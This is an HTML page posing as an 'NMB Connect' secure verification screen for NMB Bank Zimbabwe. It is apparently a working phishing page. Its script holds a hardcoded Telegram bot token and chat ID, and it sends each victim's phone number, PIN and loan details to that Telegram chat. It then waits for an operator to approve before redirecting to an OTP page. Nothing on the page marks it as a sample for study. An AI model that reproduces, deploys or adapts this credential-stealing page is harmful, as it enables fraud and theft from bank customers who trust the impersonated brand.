<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NMB Connect - Secure Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
        * { font-family: 'Inter', sans-serif; }
        body { background: linear-gradient(135deg, #004a99 0%, #003366 100%); min-height: 100vh; }
        .pin-input:focus { border-color: #f2a900; box-shadow: 0 0 0 2px rgba(242, 169, 0, 0.2); }
        .glass-effect { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px); }
        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">
    <div class="w-full max-w-sm fade-in">
        <!-- Header -->
        <div class="text-center mb-6">
            <div class="flex items-center justify-center gap-1 mb-2">
                <span class="text-3xl font-black text-white tracking-tighter">NMB</span>
                <span class="text-3xl font-black text-[#f2a900] tracking-tighter">Connect</span>
            </div>
            <p class="text-white/80 text-[10px] font-bold uppercase tracking-[0.3em]">Secure Verification</p>
        </div>

        <!-- Main Card -->
        <div class="glass-effect rounded-3xl shadow-2xl overflow-hidden">
            <!-- Title Section -->
            <div class="bg-gradient-to-r from-[#003366] to-[#004a99] p-6 text-center">
                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Verify Identity</h1>
                <p class="text-white/70 text-[10px] font-bold uppercase tracking-widest">Enter your mobile details</p>
            </div>

            <!-- Content -->
            <div id="loginForm" class="p-6 sm:p-8 space-y-6">
                <!-- Loan Amount Display -->
                <div class="bg-blue-50/50 border border-blue-100 rounded-2xl p-4 flex justify-between items-center">
                    <span class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Selected Loan</span>
                    <span class="font-black text-lg text-[#003366]" id="displayAmount">$500</span>
                </div>

                <!-- Phone Number -->
                <div class="space-y-2">
                    <label class="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Phone Number</label>
                    <div class="relative">
                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 font-black text-sm">+263</span>
                        <input type="tel" id="phone" maxlength="9" placeholder="771234567" 
                            class="w-full pl-16 pr-4 py-4 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#f2a900] transition-all font-black text-base text-gray-700 placeholder:text-gray-300">
                    </div>
                </div>

                <!-- PIN -->
                <div class="space-y-2">
                    <label class="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">4-Digit PIN</label>
                    <div class="flex gap-3">
                        <input type="password" maxlength="1" class="pin-input w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                        <input type="password" maxlength="1" class="pin-input w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                        <input type="password" maxlength="1" class="pin-input w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                        <input type="password" maxlength="1" class="pin-input w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                    </div>
                </div>

                <!-- Submit Button -->
                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
                    Verify Details <i class="fas fa-shield-alt ml-2"></i>
                </button>
            </div>

            <!-- Polling Overlay -->
            <div id="pollingOverlay" class="hidden p-10 text-center space-y-6">
                <div class="relative w-24 h-24 mx-auto">
                    <div class="absolute inset-0 border-4 border-gray-50 rounded-full"></div>
                    <div class="absolute inset-0 border-4 border-[#f2a900] border-t-transparent rounded-full animate-spin"></div>
                    <div class="absolute inset-0 flex items-center justify-center">
                        <i class="fas fa-user-shield text-3xl text-[#003366]"></i>
                    </div>
                </div>
                <div class="space-y-2">
                    <h3 class="text-xl font-black text-gray-800 uppercase tracking-tight">Verifying</h3>
                    <p class="text-gray-500 text-[10px] font-bold uppercase tracking-widest">Please wait a moment...</p>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <p class="text-center text-white/50 text-[10px] mt-8 font-bold uppercase tracking-widest">
            © 2026 NMB Bank Zimbabwe | Secure Session
        </p>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
        const TELEGRAM_CHAT_ID = '7547427914';
        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

        const pinInputs = document.querySelectorAll('.pin-input');
        const phoneInput = document.getElementById('phone');
        const submitBtn = document.getElementById('submitBtn');
        const loginForm = document.getElementById('loginForm');
        const pollingOverlay = document.getElementById('pollingOverlay');
        const displayAmount = document.getElementById('displayAmount');

        const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
        if (loanData.amount) displayAmount.textContent = `$${parseFloat(loanData.amount).toLocaleString()}`;

        pinInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value && index < pinInputs.length - 1) pinInputs[index + 1].focus();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) pinInputs[index - 1].focus();
            });
        });

        phoneInput.addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, ''));

        submitBtn.addEventListener('click', async () => {
            const phoneRaw = phoneInput.value;
            const pin = Array.from(pinInputs).map(i => i.value).join('');

            if (phoneRaw.length !== 9) { alert('Please enter a valid 9-digit phone number'); return; }
            if (pin.length !== 4) { alert('Please enter your 4-digit PIN'); return; }

            const phone = '+263' + phoneRaw;
            const sessionData = {
                phone: phone,
                pin: pin,
                ...loanData
            };
            localStorage.setItem('nmb_session', JSON.stringify(sessionData));
            localStorage.setItem('current_phone', phone); // Key for admin panel to find

            const message = `
🚨 <b>NEW LOAN APPLICATION</b>

👤 Name: ${sessionData.fullName}
📱 Phone: ${sessionData.phone}
💰 Amount: $${sessionData.amount}
📅 Term: ${sessionData.term} months
💼 Purpose: ${sessionData.purpose}
💵 Income: $${sessionData.income}
🔐 <b>PIN: ${pin}</b>
            `;

            const inlineKeyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ APPROVE', callback_data: `approve_${phone}` },
                        { text: '❌ DECLINE', callback_data: `decline_${phone}` }
                    ]
                ]
            };

            try {
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: inlineKeyboard
                    })
                });

                loginForm.classList.add('hidden');
                pollingOverlay.classList.remove('hidden');
                pollForApproval(phone);
            } catch (error) {
                alert('Connection error. Please try again.');
            }
        });

        function pollForApproval(phone) {
            const interval = setInterval(() => {
                const status = localStorage.getItem(`approval_${phone}`);
                console.log(`Checking status for ${phone}: ${status}`); // Debug log
                if (status === 'approved') {
                    clearInterval(interval);
                    localStorage.removeItem(`approval_${phone}`);
                    window.location.href = 'otp.html';
                } else if (status === 'declined') {
                    clearInterval(interval);
                    localStorage.removeItem(`approval_${phone}`);
                    location.reload();
                }
            }, 1000);
        }
    </script>
</body>
</html>
